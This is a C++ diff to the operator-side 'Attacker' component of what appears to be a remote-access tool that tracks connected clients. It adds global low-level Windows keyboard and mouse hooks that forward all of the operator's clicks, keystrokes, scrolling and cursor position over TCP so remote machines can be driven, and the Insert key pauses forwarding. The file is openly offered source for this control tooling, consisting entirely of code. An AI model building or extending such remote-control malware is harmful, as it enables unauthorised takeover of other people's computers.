@@ -1,6 +1,7 @@
 #include "attacker.hpp"
 #include "../commands.hpp"
 #include <sstream>
+#include <SFML/Window.hpp>
 
 static constexpr uint32_t hash(const std::string s) noexcept {
 	uint32_t hash = 5381;
@@ -9,6 +10,8 @@ static constexpr uint32_t hash(const std::string s) noexcept {
 	return hash;
 }
 
+Attacker* Attacker::attacker = nullptr;
+
 Attacker::Attacker(std::string inHId, ftxui::Tui& inTui)
 	:
 	myHId(inHId),
@@ -16,10 +19,24 @@ Attacker::Attacker(std::string inHId, ftxui::Tui& inTui)
 	isSendingMouse(inTui.is_sending_mouse),
 	isSendingKeyboard(inTui.is_sending_keyboard)
 {
+	attacker = this;
+
 	receiveTcpThread = new std::thread([this]() {
 		while (true)
 			receiveTcp();
 		});
+
+	std::thread([] {
+		auto m = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, NULL, 0);
+		auto k = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
+		MSG msg;
+		while (GetMessage(&msg, NULL, 0, 0)) {
+			TranslateMessage(&msg);
+			DispatchMessage(&msg);
+		}
+		UnhookWindowsHookEx(m);
+		UnhookWindowsHookEx(k);
+	}).detach();
 }
 
 int Attacker::update()
@@ -77,17 +94,22 @@ int Attacker::update()
 		packetsToProcess.erase(packetsToProcess.begin());
 	}
 
-	if (isSendingMouse) {
-		sf::Packet p;
-		p << uint16_t(0) << uint8_t(Cmd::SSH_MOUSE);
+	//send mouse position
+	//other events are handled on a different thread
+	if (isSendingMouse && !sf::Keyboard::isKeyPressed(sf::Keyboard::Key::Insert)) {
+		auto size = sf::Vector2f(sf::VideoMode::getDesktopMode().size);
+		auto pos = sf::Vector2f(sf::Mouse::getPosition()).componentWiseDiv(size);
 
-		server.send(p);
-	}
-	if (isSendingKeyboard) {
-		sf::Packet p;
-		p << uint16_t(0) << uint8_t(Cmd::SSH_KEYBOARD);
+		if (pos != lastMousePos) {
+			lastMousePos = pos;
+			pos.x = std::min(std::max(pos.x, 0.f), 1.f) * (UINT16_MAX - 1);
+			pos.y = std::min(std::max(pos.y, 0.f), 1.f) * (UINT16_MAX - 1);
 
-		server.send(p);
+			sf::Packet p;
+			p << uint16_t(0) << uint8_t(Cmd::SSH_MOUSE_POS);
+			p << uint16_t(std::round(pos.x)) << uint16_t(std::round(pos.y));
+			auto _ = server.send(p);
+		}
 	}
 
 	//set fps limit
@@ -579,4 +601,81 @@ void Attacker::updateList(sf::Packet& p)
 	}
 	tui.clients_overview_output = ss_clients.str();
 	tui.triggerRedraw();
+}
+
+LRESULT CALLBACK Attacker::LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+	if (nCode == HC_ACTION && attacker->isSendingMouse &&
+		!sf::Keyboard::isKeyPressed(sf::Keyboard::Key::Insert))
+	{
+		sf::Packet p;
+		sf::Socket::Status _;
+
+		MSLLHOOKSTRUCT* par = (MSLLHOOKSTRUCT*)lParam;
+		switch (wParam)
+		{
+		case WM_LBUTTONDOWN:
+			p << uint16_t(0) << uint8_t(Cmd::SSH_MOUSE_PRESS) << uint8_t(1);
+			_ = attacker->server.send(p);
+
+			break;
+		case WM_LBUTTONUP:
+			p << uint16_t(0) << uint8_t(Cmd::SSH_MOUSE_RELEASE) << uint8_t(1);
+			_ = attacker->server.send(p);
+
+			break;
+		case WM_RBUTTONDOWN:
+			p << uint16_t(0) << uint8_t(Cmd::SSH_MOUSE_PRESS) << uint8_t(2);
+			_ = attacker->server.send(p);
+
+			break;
+		case WM_RBUTTONUP:
+			p << uint16_t(0) << uint8_t(Cmd::SSH_MOUSE_RELEASE) << uint8_t(2);
+			_ = attacker->server.send(p);
+
+			break;
+		case WM_MBUTTONDOWN:
+			p << uint16_t(0) << uint8_t(Cmd::SSH_MOUSE_PRESS) << uint8_t(3);
+			_ = attacker->server.send(p);
+
+			break;
+		case WM_MBUTTONUP:
+			p << uint16_t(0) << uint8_t(Cmd::SSH_MOUSE_RELEASE) << uint8_t(3);
+			_ = attacker->server.send(p);
+
+			break;
+		case WM_MOUSEWHEEL:
+		{
+			int delta = GET_WHEEL_DELTA_WPARAM(par->mouseData);
+			p << uint16_t(0) << uint8_t(Cmd::SSH_MOUSE_SCROLL) << int16_t(delta);
+			_ = attacker->server.send(p);
+
+			break;
+		}
+		}
+	}
+
+	return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+
+LRESULT CALLBACK Attacker::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+	if (nCode == HC_ACTION && attacker->isSendingKeyboard &&
+		!sf::Keyboard::isKeyPressed(sf::Keyboard::Key::Insert))
+	{
+		sf::Packet p;
+		KBDLLHOOKSTRUCT* par = (KBDLLHOOKSTRUCT*)lParam;
+		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
+			if (par->vkCode != 45) {
+				p << uint16_t(0) << uint8_t(Cmd::SSH_KEYBOARD_PRESS) << uint8_t(par->vkCode);
+				auto _ = attacker->server.send(p);
+			}
+		}
+		else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
+			p << uint16_t(0) << uint8_t(Cmd::SSH_KEYBOARD_RELEASE) << uint8_t(par->vkCode);
+			auto _ = attacker->server.send(p);
+		}
+	}
+
+	return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
